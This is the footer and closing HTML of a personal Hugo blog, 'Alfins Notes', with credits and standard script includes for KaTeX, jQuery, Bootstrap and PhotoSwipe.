		  <a href="https://discord.gg/alfin3133" title="Discord">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-discord fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              <a href="https://Alfinj0se.github.io">Alfin Joseph</a>
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2024
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://Alfinj0se.github.io/">Alfins Notes</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.126.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://Alfinj0se.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://Alfinj0se.github.io/js/load-photoswipe.js"></script>









    
  </body>
</html>

